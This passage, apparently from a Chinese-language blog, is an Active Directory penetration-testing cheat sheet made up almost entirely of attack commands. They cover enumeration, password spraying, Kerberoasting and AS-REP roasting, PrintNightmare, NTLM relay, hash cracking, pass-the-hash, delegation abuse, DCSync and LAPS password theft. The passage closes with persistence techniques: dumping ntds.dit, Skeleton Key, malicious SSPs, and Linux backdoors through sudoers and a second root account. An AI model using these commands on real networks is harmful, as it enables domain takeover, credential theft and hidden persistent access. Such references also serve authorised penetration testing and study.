</span><br></pre></td></tr></table></figure><h1 id="6-查找用户名"><a href="#6-查找用户名" class="headerlink" title="6.查找用户名"></a>6.查找用户名</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -U &lt;dc-ip&gt; | grep &#39;user:&#39;</span><br><span class="line"></span><br><span class="line">crackmapexec smb &lt;ip&gt; -u &lt;user&gt; -p &#39;&lt;password&gt;&#39; --users </span><br><span class="line"></span><br><span class="line">nmap -p 88 --script&#x3D;krb5-enum-users --script-args&#x3D;&quot;krb5-enum-users.realm&#x3D;&#39;&lt;domain&gt;&#39;,userdb&#x3D;&lt;users_list_file&gt;&quot; &lt;ip&gt; </span><br><span class="line"></span><br><span class="line">OSINT - 在互联网上寻找用户名</span><br></pre></td></tr></table></figure><h2 id="得到账号，但是没有密码"><a href="#得到账号，但是没有密码" class="headerlink" title="得到账号，但是没有密码"></a>得到账号，但是没有密码</h2><h3 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">获取域密码策略 ：</span><br><span class="line">crackmapexec &lt;IP&gt; -u &#39;user&#39; -p &#39;password&#39; --pass-pol</span><br><span class="line">enum4linx -u &#39;username&#39; -p &#39;password&#39; -P &lt;IP&gt;</span><br><span class="line"></span><br><span class="line">cme smb &lt;dc-ip&gt; -u user.txt -p password.txt --no-bruteforce # 不爆破，只测试单一的 user&#x3D;password</span><br><span class="line"></span><br><span class="line">cme smb &lt;dc-ip&gt; -u user.txt -p password.txt # 交叉爆破，根据密码策略，失败过多可能会被封禁</span><br></pre></td></tr></table></figure><h3 id="ASREP-Roasting攻击"><a href="#ASREP-Roasting攻击" class="headerlink" title="ASREP-Roasting攻击"></a>ASREP-Roasting攻击</h3><h4 id="获取hash"><a href="#获取hash" class="headerlink" title="获取hash"></a>获取hash</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py &lt;domain&gt;&#x2F; -usersfile &lt;usernames.txt&gt; -format hashcat -outputfile &lt;hashes.domain.txt&gt;</span><br><span class="line"></span><br><span class="line">Rubeus asreproast &#x2F;format:hashcat</span><br></pre></td></tr></table></figure><h4 id="获取ASREP-Roastable账号"><a href="#获取ASREP-Roastable账号" class="headerlink" title="获取ASREP-Roastable账号"></a>获取ASREP-Roastable账号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -PreauthNotRequired -Properties SamAccountName</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;dontreqpreauth:true&#125;), (c:Computer), p&#x3D;shortestPath((u)-[*1..]-&gt;(c)) RETURN p</span><br></pre></td></tr></table></figure><h2 id="拿到任意一个域用户的账号密码"><a href="#拿到任意一个域用户的账号密码" class="headerlink" title="拿到任意一个域用户的账号密码"></a>拿到任意一个域用户的账号密码</h2><h3 id="获取其他账户密码"><a href="#获取其他账户密码" class="headerlink" title="获取其他账户密码"></a>获取其他账户密码</h3><h4 id="1-获取域内所有账户名"><a href="#1-获取域内所有账户名" class="headerlink" title="1.获取域内所有账户名"></a>1.获取域内所有账户名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetADUsers.py -all -dc-ip &lt;dc_ip&gt; &lt;domain&gt;&#x2F;&lt;username&gt;</span><br></pre></td></tr></table></figure><h4 id="2-枚举-SMB-共享"><a href="#2-枚举-SMB-共享" class="headerlink" title="2.枚举 SMB 共享"></a>2.枚举 SMB 共享</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --shares</span><br></pre></td></tr></table></figure><h4 id="3-bloodhound"><a href="#3-bloodhound" class="headerlink" title="3.bloodhound"></a>3.bloodhound</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; -gc &lt;dc&gt; -c all</span><br></pre></td></tr></table></figure><h4 id="4-powerview-pywerview"><a href="#4-powerview-pywerview" class="headerlink" title="4.powerview / pywerview"></a>4.powerview / pywerview</h4><h3 id="Kerberoasting攻击"><a href="#Kerberoasting攻击" class="headerlink" title="Kerberoasting攻击"></a>Kerberoasting攻击</h3><h4 id="获取hash-1"><a href="#获取hash-1" class="headerlink" title="获取hash"></a>获取hash</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GetUserSPNs.py -request -dc-ip &lt;dc_ip&gt; &lt;domain&gt;&#x2F;&lt;user&gt;:&lt;password&gt;</span><br><span class="line"></span><br><span class="line">Rubeus kerberoast</span><br></pre></td></tr></table></figure><h4 id="查找-kerberoastable-账号"><a href="#查找-kerberoastable-账号" class="headerlink" title="查找 kerberoastable 账号"></a>查找 kerberoastable 账号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;hasspn:true&#125;) RETURN u</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;hasspn:true&#125;), (c:Computer), p&#x3D;shortestPath((u)-[*1..]-&gt;(c)) RETURN p</span><br></pre></td></tr></table></figure><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>FindSMB2UPTime.py <ip></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; lookupnames &lt;name&gt;</span><br><span class="line"></span><br><span class="line">wmic useraccount get name,sid</span><br><span class="line"></span><br><span class="line">auxiliary&#x2F;admin&#x2F;kerberos&#x2F;ms14_068_kerberos_checksum</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goldenPac.py -dc-ip &lt;dc_ip&gt; &lt;domain&gt;&#x2F;&lt;user&gt;:&#39;&lt;password&gt;&#39;@&lt;target&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc &quot;&lt;ticket&gt;&quot;</span><br></pre></td></tr></table></figure><h3 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2021-1675.py &lt;domain&gt;&#x2F;&lt;user&gt;:&lt;password&gt;@&lt;target&gt; &#39;\\&lt;smb_server_ip&gt;\&lt;share&gt;\inject.dll&#39;</span><br></pre></td></tr></table></figure><h3 id="枚举-DNS-服务器"><a href="#枚举-DNS-服务器" class="headerlink" title="枚举 DNS 服务器"></a>枚举 DNS 服务器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnstool.py -u &#39;DOMAIN\user&#39; -p &#39;password&#39; --record &#39;*&#39; --action query &lt;dc_ip&gt;</span><br></pre></td></tr></table></figure><h1 id="7-relay-poisoning攻击"><a href="#7-relay-poisoning攻击" class="headerlink" title="7.relay/poisoning攻击"></a>7.relay/poisoning攻击</h1><h3 id="扫描没开启SMB签名的机器"><a href="#扫描没开启SMB签名的机器" class="headerlink" title="扫描没开启SMB签名的机器"></a>扫描没开启SMB签名的机器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sS -T4 --open --script smb-security-mode -p445 ADDRESS&#x2F;MASK</span><br><span class="line"></span><br><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;smb_relay</span><br><span class="line"></span><br><span class="line">cme smb $hosts --gen-relay-list relay.txt</span><br></pre></td></tr></table></figure><h3 id="PetitPotam"><a href="#PetitPotam" class="headerlink" title="PetitPotam"></a>PetitPotam</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PetitPotam.py  -d &lt;domain&gt; &lt;listener_ip&gt; &lt;target_ip&gt;</span><br></pre></td></tr></table></figure><p>后续可以跟着adcs攻击</p><h3 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">responder -i eth0</span><br><span class="line">mitm6 -d &lt;domain&gt;</span><br></pre></td></tr></table></figure><h2 id="无SMB签名-开启IPv6-ADCS"><a href="#无SMB签名-开启IPv6-ADCS" class="headerlink" title="无SMB签名 || 开启IPv6 || ADCS"></a>无SMB签名 || 开启IPv6 || ADCS</h2><h3 id="1-MS08-068"><a href="#1-MS08-068" class="headerlink" title="1.MS08-068"></a>1.MS08-068</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;smb_relay #常用于windows2003 &#x2F; windows server2008</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 # 记得先关闭本机的 smb 和 http 服务</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -tf targets.txt </span><br></pre></td></tr></table></figure><h3 id="2-mitm6-i-eth0-d"><a href="#2-mitm6-i-eth0-d" class="headerlink" title="2.mitm6 -i eth0 -d "></a>2.mitm6 -i eth0 -d <domain></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ntlmrelayx.py -6 -wh &lt;attacker_ip&gt; -l &#x2F;tmp -socks -debug</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -6 -wh &lt;attacker_ip&gt; -t smb:&#x2F;&#x2F;&lt;target&gt; -l &#x2F;tmp -socks -debug</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -t ldaps:&#x2F;&#x2F;&lt;dc_ip&gt; -wh &lt;attacker_ip&gt; --delegate-access</span><br><span class="line"></span><br><span class="line">getST.py -spn cifs&#x2F;&lt;target&gt; &lt;domain&gt;&#x2F;&lt;netbios_name&gt;\$ -impersonate &lt;user&gt;</span><br></pre></td></tr></table></figure><h3 id="3-adcs"><a href="#3-adcs" class="headerlink" title="3.adcs"></a>3.adcs</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ntlmrelayx.py -t http:&#x2F;&#x2F;&lt;dc_ip&gt;&#x2F;certsrv&#x2F;certfnsh.asp -debug -smb2support --adcs --template DomainController</span><br><span class="line"></span><br><span class="line">Rubeus.exe asktgt &#x2F;user:&lt;user&gt; &#x2F;certificate:&lt;base64-certificate&gt; &#x2F;ptt</span><br></pre></td></tr></table></figure><h2 id="拿到hash破解"><a href="#拿到hash破解" class="headerlink" title="拿到hash破解"></a>拿到hash破解</h2><h4 id="1-LM"><a href="#1-LM" class="headerlink" title="1.LM"></a>1.LM</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --format&#x3D;lm hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 3000 -a 3 hash.txt</span><br></pre></td></tr></table></figure><h4 id="2-NTLM"><a href="#2-NTLM" class="headerlink" title="2.NTLM"></a>2.NTLM</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --format&#x3D;nt hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 1000 -a 3 hash.txt</span><br></pre></td></tr></table></figure><h4 id="3-NTLMv1"><a href="#3-NTLMv1" class="headerlink" title="3.NTLMv1"></a>3.NTLMv1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --format&#x3D;netntlm hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 5500 -a 3 hash.txt</span><br></pre></td></tr></table></figure><h4 id="4-NTLMv2"><a href="#4-NTLMv2" class="headerlink" title="4.NTLMv2"></a>4.NTLMv2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --format&#x3D;netntlmv2 hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 5600 -a 0 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure><h4 id="5-Kerberos-5-TGS"><a href="#5-Kerberos-5-TGS" class="headerlink" title="5.Kerberos 5 TGS"></a>5.Kerberos 5 TGS</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john spn.txt --format&#x3D;krb5tgs --wordlist&#x3D;rockyou.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 13100 -a 0 spn.txt rockyou.txt</span><br></pre></td></tr></table></figure><h4 id="6-Kerberos-ASREP"><a href="#6-Kerberos-ASREP" class="headerlink" title="6.Kerberos ASREP"></a>6.Kerberos ASREP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 -a 0 AS-REP_roast-hashes rockyou.txt</span><br></pre></td></tr></table></figure><h1 id="9-横向移动"><a href="#9-横向移动" class="headerlink" title="9.横向移动"></a>9.横向移动</h1><h2 id="1-PTH"><a href="#1-PTH" class="headerlink" title="1.PTH"></a>1.PTH</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">psexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt;</span><br><span class="line"></span><br><span class="line">wmiexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt;</span><br><span class="line"></span><br><span class="line">atexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt; &quot;command&quot;</span><br><span class="line"></span><br><span class="line">evil-winrm -i &lt;ip&gt;&#x2F;&lt;domain&gt; -u &lt;user&gt; -H &lt;hash&gt;</span><br><span class="line"></span><br><span class="line">xfreerdp &#x2F;u:&lt;user&gt; &#x2F;d:&lt;domain&gt; &#x2F;pth:&lt;hash&gt; &#x2F;v:&lt;ip&gt;</span><br></pre></td></tr></table></figure><h2 id="2-PTK"><a href="#2-PTK" class="headerlink" title="2.PTK"></a>2.PTK</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python getTGT.py &lt;domain&gt;&#x2F;&lt;user&gt; -hashes :&lt;hashes&gt;</span><br><span class="line">export KRB5CCNAME&#x3D;&#x2F;root&#x2F;impacket-examples&#x2F;domain_ticket.ccache</span><br><span class="line">python psexec.py &lt;domain&gt;&#x2F;&lt;user&gt;@&lt;ip&gt; -k -no-pass</span><br><span class="line"></span><br><span class="line">Rubeus asktgt &#x2F;user:victim &#x2F;rc4:&lt;rc4value&gt;</span><br><span class="line">Rubeus ptt &#x2F;ticket:&lt;ticket&gt;</span><br><span class="line">Rubeus createnetonly &#x2F;program:C:\Windows\System32\[cmd.exe||upnpcont.exe]</span><br><span class="line">Rubeus ptt &#x2F;luid:0xdeadbeef &#x2F;ticket:&lt;ticket&gt;</span><br></pre></td></tr></table></figure><h2 id="3-非约束委派"><a href="#3-非约束委派" class="headerlink" title="3.非约束委派"></a>3.非约束委派</h2><h3 id="获取票据"><a href="#获取票据" class="headerlink" title="获取票据"></a>获取票据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug sekurlsa::tickets &#x2F;export sekurlsa::tickets &#x2F;export</span><br><span class="line"></span><br><span class="line">Rubeus dump &#x2F;service:krbtgt &#x2F;nowrap</span><br><span class="line"></span><br><span class="line">Rubeus dump &#x2F;luid:0xdeadbeef &#x2F;nowrap</span><br></pre></td></tr></table></figure><h3 id="查找非约束委派主机"><a href="#查找非约束委派主机" class="headerlink" title="查找非约束委派主机"></a>查找非约束委派主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Get-NetComputer -Unconstrained</span><br><span class="line"></span><br><span class="line">Get-DomainComputer -Unconstrained -Properties DnsHostName</span><br><span class="line"></span><br><span class="line">MATCH (c:Computer &#123;unconstraineddelegation:true&#125;) RETURN c</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;owned:true&#125;), (c:Computer &#123;unconstraineddelegation:true&#125;), p&#x3D;shortestPath((u)-[*1..]-&gt;(c)) RETURN p</span><br></pre></td></tr></table></figure><h2 id="4-约束委派"><a href="#4-约束委派" class="headerlink" title="4.约束委派"></a>4.约束委派</h2><h3 id="获取票据-1"><a href="#获取票据-1" class="headerlink" title="获取票据"></a>获取票据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug sekurlsa::tickets &#x2F;export sekurlsa::tickets &#x2F;</span><br><span class="line"></span><br><span class="line">Rubeus dump &#x2F;service:krbtgt &#x2F;nowrap</span><br><span class="line"></span><br><span class="line">Rubeus dump &#x2F;luid:0xdeadbeef &#x2F;nowrap</span><br></pre></td></tr></table></figure><h3 id="查找约束委派主机"><a href="#查找约束委派主机" class="headerlink" title="查找约束委派主机"></a>查找约束委派主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo</span><br><span class="line"></span><br><span class="line">MATCH (c:Computer), (t:Computer), p&#x3D;((c)-[:AllowedToDelegate]-&gt;(t)) RETURN p</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;owned:true&#125;), (c:Computer &#123;name: &quot;&lt;MYTARGET.FQDN&gt;&quot;&#125;), p&#x3D;shortestPath((u)-[*1..]-&gt;(c)) RETURN p</span><br></pre></td></tr></table></figure><h2 id="5-基于资源的约束委派"><a href="#5-基于资源的约束委派" class="headerlink" title="5.基于资源的约束委派"></a>5.基于资源的约束委派</h2><h2 id="6-dcsync"><a href="#6-dcsync" class="headerlink" title="6.dcsync"></a>6.dcsync</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:htb.local &#x2F;user:krbtgt # Administrators, Domain Admins, Enterprise Admins  组下的账户都行</span><br></pre></td></tr></table></figure><h2 id="7-打印机-SpoolService-漏洞利用"><a href="#7-打印机-SpoolService-漏洞利用" class="headerlink" title="7.打印机 SpoolService 漏洞利用"></a>7.打印机 SpoolService 漏洞利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpcdump.py &lt;domain&gt;&#x2F;&lt;user&gt;:&lt;password&gt;@&lt;domain_server&gt; | grep MS-RPRN</span><br><span class="line">printerbug.py &#39;&lt;domain&gt;&#x2F;&lt;username&gt;:&lt;password&gt;&#39;@&lt;Printer IP&gt; &lt;RESPONDERIP&gt;</span><br></pre></td></tr></table></figure><h2 id="8-AD域ACL攻击-aclpwn-py"><a href="#8-AD域ACL攻击-aclpwn-py" class="headerlink" title="8.AD域ACL攻击(aclpwn.py)"></a>8.AD域ACL攻击(aclpwn.py)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GenericAll on User</span><br><span class="line">GenericAll on Group</span><br><span class="line">GenericAll &#x2F; GenericWrite &#x2F; Write on Computer</span><br><span class="line">WriteProperty on Group</span><br><span class="line">Self (Self-Membership) on Group</span><br><span class="line">WriteProperty (Self-Membership)</span><br><span class="line">ForceChangePassword</span><br><span class="line">WriteOwner on Group</span><br><span class="line">GenericWrite on User</span><br><span class="line">WriteDACL + WriteOwner</span><br></pre></td></tr></table></figure><h2 id="9-获取LAPS管理员密码"><a href="#9-获取LAPS管理员密码" class="headerlink" title="9.获取LAPS管理员密码"></a>9.获取LAPS管理员密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-LAPSPasswords -DomainController &lt;ip_dc&gt; -Credential &lt;domain&gt;\&lt;login&gt; | Format-Table -AutoSize</span><br><span class="line"></span><br><span class="line">foreach ($objResult in $colResults)&#123;$objComputer &#x3D; $objResult.Properties; $objComputer.name|where &#123;$objcomputer.name -ne $env:computername&#125;|%&#123;foreach-object &#123;Get-AdmPwdPassword -ComputerName $_&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="10-privexchange漏洞"><a href="#10-privexchange漏洞" class="headerlink" title="10.privexchange漏洞"></a>10.privexchange漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python privexchange.py -ah &lt;attacker_host_or_ip&gt; &lt;exchange_host&gt; -u &lt;user&gt; -d &lt;domain&gt; -p &lt;password&gt;</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -t ldap:&#x2F;&#x2F;&lt;dc_fqdn&gt;--escalate-user &lt;user&gt;</span><br></pre></td></tr></table></figure><h5 id="Exchange的利用"><a href="#Exchange的利用" class="headerlink" title="Exchange的利用"></a>Exchange的利用</h5><ul><li><a href="https://github.com/Ridter/Exchange2domain"><strong>Exchange2domain</strong></a></li><li><a href="https://github.com/WyAtu/CVE-2018-8581/"><strong>CVE-2018-8581</strong></a></li><li><a href="https://github.com/Ridter/CVE-2019-1040"><strong>CVE-2019-1040</strong></a></li><li><a href="https://github.com/Ridter/CVE-2020-0688"><strong>CVE-2020-0688</strong></a></li><li><a href="https://github.com/Arno0x/NtlmRelayToEWS"><strong>NtlmRelayToEWS</strong></a></li><li><a href="https://github.com/3gstudent/ewsManage"><strong>ewsManage</strong></a></li><li><a href="https://github.com/h4x0r-dz/CVE-2021-26855"><strong>CVE-2021-26855</strong></a></li><li><a href="https://gist.github.com/testanull/9ebbd6830f7a501e35e67f2fcaa57bda"><strong>CVE-2021-28482</strong></a></li></ul><h2 id="11-IPC"><a href="#11-IPC" class="headerlink" title="11.IPC"></a>11.IPC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use \\ip\ipc$ &quot;password&quot; &#x2F;user:&quot;administrator&quot;</span><br><span class="line">net use \\ip\c$ &quot;password&quot; &#x2F;user:&quot;administrator&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="12-其他横移"><a href="#12-其他横移" class="headerlink" title="12.其他横移"></a>12.其他横移</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.向WSUS服务器数据库注入恶意程序更新WSUSpendu.ps1 # 需要先拿下 WSUS 更新分发服务器</span><br><span class="line"></span><br><span class="line">2.MSSQL Trusted Linksuse exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_linkcrawler</span><br><span class="line"></span><br><span class="line">3.GPO Delegation</span><br><span class="line"></span><br><span class="line">4.ADCS</span><br><span class="line"></span><br><span class="line">5.钉钉 6.3.5 RCE https:&#x2F;&#x2F;github.com&#x2F;crazy0x70&#x2F;dingtalk-RCE</span><br><span class="line"></span><br><span class="line">6.向日葵11.1 RCE</span><br></pre></td></tr></table></figure><h1 id="10-权限维持"><a href="#10-权限维持" class="headerlink" title="10.权限维持"></a>10.权限维持</h1><h2 id="拿到域控权限"><a href="#拿到域控权限" class="headerlink" title="拿到域控权限"></a>拿到域控权限</h2><p>dump ntds.dit 文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 127.0.0.1 -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; --ntds</span><br><span class="line"></span><br><span class="line">secretsdump.py &#39;&lt;domain&gt;&#x2F;&lt;user&gt;:&lt;pass&gt;&#39;@&lt;ip&gt;</span><br><span class="line"></span><br><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\temp&quot; q q</span><br><span class="line"></span><br><span class="line">secretsdump.py  -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract</span><br><span class="line"></span><br><span class="line">windows&#x2F;gather&#x2F;credentials&#x2F;domain_hashdump</span><br></pre></td></tr></table></figure><h2 id="Windows后门"><a href="#Windows后门" class="headerlink" title="Windows后门"></a>Windows后门</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; myuser &#x2F;add &#x2F;domain</span><br><span class="line"></span><br><span class="line">Golden ticket（黄金票据）</span><br><span class="line"></span><br><span class="line">Silver Ticket（白银票据）</span><br><span class="line"></span><br><span class="line">DSRM 后门：</span><br><span class="line">PowerShell New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD</span><br><span class="line"></span><br><span class="line">Skeleton Key：</span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;misc::skeleton&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">自定义 SSP DLL：</span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;misc::memssp&quot; &quot;exit&quot;</span><br><span class="line">C:\Windows\System32\kiwissp.log</span><br></pre></td></tr></table></figure><h2 id="Linux后门"><a href="#Linux后门" class="headerlink" title="Linux后门"></a>Linux后门</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> # echo &quot;0range ALL&#x3D;(ALL) ALL&quot; &gt;&gt; &#x2F;etc&#x2F;sudoers 将现有普通用户添加为 sudo 用户</span><br><span class="line"> # useradd -u 0 -g 0 -o adv -m -s &#x2F;bin&#x2F;bash 添加超管账户</span><br><span class="line">ps: 相比贸然去新增用户, 